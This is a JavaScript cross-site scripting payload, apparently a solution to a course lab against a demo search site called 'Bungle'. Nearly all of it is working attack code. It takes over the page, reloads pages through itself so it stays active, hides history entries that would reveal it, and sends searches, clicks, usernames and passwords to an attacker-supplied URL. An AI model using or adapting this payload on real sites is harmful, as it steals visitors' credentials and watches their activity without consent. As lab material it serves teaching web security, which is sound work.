<script>
// Extend this function:
function payload(attacker) {

	function record(action){
		var request = $.ajax({
		  url: attacker,
		  type: "GET",
		  data: action
		});
	}

	function inject_bad_stuff(){
		<!-- search button -->
		<!-- for_fun_tag -->
		
		$('form').attr('onsubmit', 'return false;')
		$('#search-again-btn').removeAttr('href')

		$('#search-btn').click( function(){
				$("html").hide();
				record({
					'action': 'search', 
					'data': $('#query').val()
				})
				proxy("./search?q=" + $('#query').val())
			}
		)
		$('#bungle-lnk').click( function(e){
				e.preventDefault();
				$("html").hide();
				record({
					'action': 'home'
				})
				proxy("./")
			}
		)
		
		$('#search-again-btn').click( function(){
				$("html").hide();
				record({
					'action': 'research'
				})
				proxy("./")
			}
		)

		$('#new-account-btn').click( function(){
				$("html").hide();
				record({
					'action': 'create_account',
					'user': $('#username').val(),
					'password': $('#userpass').val()
				})
				proxy("./create", {
					'username':$('#username').val(), 
					'password':$('#userpass').val()
				})
			}
		)

		$('#log-in-btn').click( function(){
				$("html").hide();
				record({
					'action': 'login',
					'user': $('#username').val(),
					'password': $('#userpass').val()
				})
				proxy("./login", {
					'username':$('#username').val(), 
					'password':$('#userpass').val()
				})
			}
		)
		
		$('#log-out-btn').click( function(){
				$("html").hide();
				record({
					'action': 'logout'
				})
				proxy("./logout", {})
			}
		)

		$('#history-list').children().each(
			function(){
			    if ( $(this).text().includes('for_fun_tag')) $(this).hide();
			    else{
			    	var s = $(this).text()
			    	$(this).click(
			    		function(e){
			    			e.preventDefault();
			    			record({
								'action': 'search_history', 
								'data': s
							})
							proxy("./search?q=" + s)
			    		}
			    	)
			    }
			}
		)

	}


	function proxy(href, param) {
		
		if ( param ){
			$("html").load(href, param, function(responseTxt,statusTxt,xhr){

				if (statusTxt == 'error'){
					var form = $('<form action="' + href + '" method="post">' +
					  '<input type="text" name="username" value="' + param['username'] + '" />' +
					  '<input type="password" name="password" value="' + param['password'] + '" />' +
					  '</form>');
					$('html').append(form);
					form.submit();
				}
				else{
					inject_bad_stuff()
					$("#query").val("pwned!");
				}
				$("html").show();
			});
		}
		else{
			$("html").load(href, function(responseTxt,statusTxt,xhr){
				inject_bad_stuff()
				$("html").show();
				$("#query").val("pwned!");
			});
		}
	}


	$("html").hide();
	record({'action':'start'})
	proxy("./");
}
</script>
